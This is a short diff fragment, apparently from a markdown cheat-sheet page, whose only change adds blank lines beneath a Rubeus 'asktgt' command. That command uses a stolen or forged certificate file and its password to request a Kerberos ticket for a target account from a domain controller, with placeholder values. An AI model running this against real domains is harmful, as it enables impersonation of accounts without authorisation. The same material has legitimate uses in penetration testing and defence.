@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:17.485526+00:00'
 ```bash
 Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
 ```
+
+
